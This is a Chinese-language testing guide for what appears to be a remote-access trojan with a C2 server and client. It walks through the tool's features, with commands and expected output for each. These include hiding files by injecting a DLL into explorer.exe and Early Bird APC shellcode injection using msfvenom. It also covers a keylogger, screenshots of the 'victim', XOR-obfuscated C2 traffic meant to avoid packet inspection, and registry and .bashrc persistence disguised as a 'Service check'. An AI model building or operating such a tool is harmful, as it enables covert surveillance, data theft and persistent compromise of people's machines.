# testing

## 基本指令測試

```ps1
cd ..
dir
upload PEiD.exe
start PEiD.exe
get https://download.sysinternals.com/files/ProcessExplorer.zip
dir | findstr Process
```

---

## 檔案隱藏測試（hide_files）

### 前置準備
1. 用 MSVC 編譯 hidden.dll：
   ```ps1
   cl /LD src/ptr/src/hidden.cpp /Fe:hidden.dll /I src/ptr/include /link MinHook.x64.lib
   ```
2. 將 hidden.dll 放在與 client.exe 相同目錄

### 測試步驟
1. 啟動 server.py
2. 啟動 client.exe
3. 在 server 輸入 `hide_files`
4. 觀察 Explorer 中的 client.exe / srv.exe / hidden.dll 是否消失
5. 用 `dir` 命令確認檔案仍然存在（只是看不見）

```ps1
# Server 端
hide_files
# 預期回傳：
# [+] File hiding activated!
#     DLL injected into explorer.exe (PID: xxxx)
#     Hidden files: client.exe, srv.exe, hidden.dll
```

### 解除隱藏
```ps1
eject_hidden
# 然後重啟 Explorer：
# taskkill /f /im explorer.exe && start explorer.exe
```

---

## APC 注入測試（inject）

### 說明
Early Bird APC Injection：建立 Suspended 狀態的 notepad.exe，寫入 shellcode 後透過 QueueUserAPC 執行。

### 測試步驟
1. 啟動 server.py 和 client.exe
2. 使用 msfvenom 產生 calc.exe shellcode：
   ```bash
   msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=none -f raw | base64
   ```
3. 將 base64 shellcode 貼到 server：
   ```ps1
   inject <base64_shellcode>
   ```
4. 預期：notepad.exe 被創建並執行 calc.exe

### 注意事項
- 需要 Windows 環境
- 某些防毒軟體可能會攔截
- 若失敗，檢查 `GetLastError()` 回傳值

---

## 鍵盤記錄器測試（kl_start）

### 測試步驟
1. 啟動 server.py 和 client.exe
2. 在 server 輸入：
   ```ps1
   kl_start
   ```
3. 預期回傳：`[+] Keylogger Started.`
4. 在受害端打字（記事本、瀏覽器都可以）
5. 等待 5 秒（keylogger 每 5 秒寫入一次）
6. 檢查 `%appdata%\srv.txt` 是否有鍵盤記錄

### 快捷鍵
- 按方向鍵（↑↓←→）會觸發 `sys.exit(0)`，client 會退出

---

## 螢幕截圖測試（screenshot）

### 說明
擷取受害端螢幕截圖，以 base64 編碼傳輸，server 端自動存為 BMP 檔案。

### 測試步驟
1. 啟動 server.py 和 client.exe
2. 在 server 輸入：
   ```ps1
   screenshot
   ```
3. 預期回傳：
   ```
   [+] Screenshot captured (1920x1080, 6220854 bytes)
   ```
4. server 端會自動存檔為 `screenshot_YYYYMMDD_HHMMSS.bmp`
5. 用圖片檢視器開啟確認截圖內容

### 注意事項
- Windows：使用 gdi32.dll BitBlt，不需要額外套件
- Linux：需要安裝 `scrot` 或 `gnome-screenshot`
  ```bash
  sudo apt install scrot
  ```
- 截圖格式為 BMP（Windows）或 PNG（Linux）
- 大型螢幕可能產生數 MB 的檔案

---

## XOR 加密通訊測試

### 說明
client 和 server 之間的通訊使用 XOR 加密，避免被 Wireshark 等工具明文擷取。

### 測試步驟
1. 使用自訂金鑰啟動：
   ```ps1
   # Server 端
   $env:SP_XOR_KEY = "MySecretKey123"
   python src/module/server.py

   # Client 端
   $env:SP_XOR_KEY = "MySecretKey123"
   python src/module/client.py
   ```
2. 執行任意指令（如 `dir`）
3. 用 Wireshark 擷取 TCP 流量（port 12345）
4. 確認封包內容不是明文 JSON

### 驗證加密正確性
```python
# Python 互動式測試
from src.module.client import xor_crypt
data = b"test command"
encrypted = xor_crypt(data)
decrypted = xor_crypt(encrypted)
assert decrypted == data  # XOR 對稱：加密兩次 = 原文
print("XOR 加密驗證通過")
```

### 注意事項
- client 和 server 的 `SP_XOR_KEY` 必須相同
- 預設金鑰：`SecretPassage2024`
- 金鑰為空時不加密（向後相容）

---

## 持久化測試（persist）

### Windows 測試
1. 啟動 client.exe
2. 檢查 Registry：
   ```ps1
   reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ServiceCheck
   ```
3. 預期看到 `%appdata%\srv.exe`
4. 重開機後 client 會自動啟動

### Linux 測試
1. 啟動 client.py
2. 檢查 `~/.bashrc` 或 `~/.profile`：
   ```bash
   tail -5 ~/.bashrc
   ```
3. 預期看到：
   ```
   # Service check
   (nohup ~/.local/bin/srv >/dev/null 2>&1 &)
   ```

---

## 環境變數配置測試

### 說明
所有設定都可透過環境變數覆蓋，方便在不同環境中部署。

### 可用環境變數
| 變數 | 說明 | 預設值 |
|------|------|--------|
| `SP_SERVER_IP` | C2 Server IP | `127.0.0.1` |
| `SP_SERVER_PORT` | C2 Server Port | `12345` |
| `SP_XOR_KEY` | XOR 加密金鑰 | `SecretPassage2024` |

### 測試步驟
```ps1
# 自訂 IP 和 Port
$env:SP_SERVER_IP = "192.168.1.100"
$env:SP_SERVER_PORT = "4444"
$env:SP_XOR_KEY = "CustomKey2024"

python src/module/client.py
```

---

## 完整功能測試流程

### 環境準備
1. Windows 10/11 虛擬機
2. Python 3.10+
3. MSVC（編譯 hidden.dll 用）
4. Wireshark（驗證加密）

### 測試順序
1. **基本連線**：啟動 server → 啟動 client → 執行 `dir`
2. **加密通訊**：用 Wireshark 確認封包加密
3. **檔案上傳下載**：`upload test.txt` → `download test.txt`
4. **螢幕截圖**：`screenshot` → 確認 BMP 檔案
5. **鍵盤記錄**：`kl_start` → 打字 → 檢查 `srv.txt`
6. **檔案隱藏**：`hide_files` → 確認 Explorer 看不到
7. **APC 注入**：`inject <shellcode>` → 確認 calc.exe 執行
8. **持久化**：重開機 → 確認 client 自動啟動
9. **清除**：`eject_hidden` → 重啟 Explorer

### 預期結果
所有功能正常運作，Wireshark 無法看到明文 C2 指令。
